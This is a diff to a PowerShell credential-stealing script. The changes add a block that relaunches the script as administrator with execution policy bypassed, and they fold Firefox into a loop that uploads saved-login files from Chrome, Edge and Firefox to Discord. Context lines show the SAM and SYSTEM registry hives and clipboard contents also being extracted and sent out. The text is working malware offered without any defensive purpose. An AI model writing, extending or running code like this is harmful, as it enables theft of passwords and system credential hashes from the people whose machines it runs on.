@@ -39,6 +39,12 @@ function Send-FileToDiscord {
     }
 }
 
+# Ensure script runs as admin
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
 # Extract and Upload SAM and SYSTEM Registry Hives
 try {
     $samPath = "$env:TEMP\sam"
@@ -87,44 +93,28 @@ try {
     Write-Host "Error extracting clipboard content: $_"
 }
 
-# Extract Browser Saved Credentials (Google Chrome and Microsoft Edge)
+# Extract Browser Saved Credentials (Including Firefox)
 try {
-    $browsers = @('Google\\Chrome', 'Microsoft\\Edge')
+    $browsers = @('Google\\Chrome', 'Microsoft\\Edge', 'Mozilla\\Firefox')
     foreach ($browser in $browsers) {
-        $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
-        if (Test-Path $loginData) {
-            Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
-            Send-PayloadToDiscord -content "Browser: $browser - Login Data file uploaded."
+        if ($browser -eq 'Mozilla\\Firefox') {
+            $firefoxProfiles = Join-Path "$env:APPDATA\Mozilla\Firefox\Profiles" "*.default-release"
+            foreach ($profile in Get-ChildItem $firefoxProfiles) {
+                $loginData = Join-Path $profile.FullName "logins.json"
+                if (Test-Path $loginData) {
+                    Send-FileToDiscord -filePath $loginData -fileName "Firefox_LoginData"
+                }
+            }
+        } else {
+            $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
+            if (Test-Path $loginData) {
+                Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
+            }
         }
     }
 } catch {
     Write-Host "Error extracting browser credentials: $_"
-}
-
-# Extract Firefox Saved Credentials
-try {
-    $firefoxProfilesPath = Join-Path $env:APPDATA "Mozilla\Firefox\Profiles"
-    $firefoxProfiles = Get-ChildItem -Path $firefoxProfilesPath -Filter "*.default-release" | Select-Object -First 1
-
-    if ($firefoxProfiles) {
-        $profilePath = $firefoxProfiles.FullName
-        $loginsFile = Join-Path $profilePath "logins.json"
-        $keyFile = Join-Path $profilePath "key4.db"
-
-        if (Test-Path $loginsFile -and Test-Path $keyFile) {
-            # Send the files to Discord
-            Send-FileToDiscord -filePath $loginsFile -fileName "Firefox_logins.json"
-            Send-FileToDiscord -filePath $keyFile -fileName "Firefox_key4.db"
-            Send-PayloadToDiscord -content "Firefox credentials files uploaded: logins.json and key4.db"
-        } else {
-            Send-PayloadToDiscord -content "Firefox credentials files not found: logins.json or key4.db"
-        }
-    } else {
-        Send-PayloadToDiscord -content "No Firefox profile found."
-    }
-} catch {
-    Write-Host "Error extracting Firefox credentials: $_"
-    Send-PayloadToDiscord -content "Error extracting Firefox credentials: $_"
+    Send-PayloadToDiscord -content "Error extracting browser credentials: $_"
 }
 
 # List Files in My Documents
